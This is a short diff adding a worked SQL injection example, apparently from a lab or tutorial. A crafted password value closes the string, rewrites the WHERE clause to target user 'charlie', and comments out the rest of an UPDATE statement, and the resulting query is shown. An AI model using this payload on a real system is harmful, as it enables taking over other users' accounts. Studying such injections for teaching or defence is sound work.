@@ -1,0 +1,4 @@
+new_password="h4ck3d' WHERE username='charlie' -- '"
+
+SQL Query: UPDATE users SET password = 'h4ck3d' WHERE username='charlie' -- '' WHERE username = 'kathy' AND password = ''
+=> removing the commented code: UPDATE users SET password = 'h4ck3d' WHERE username='charlie';
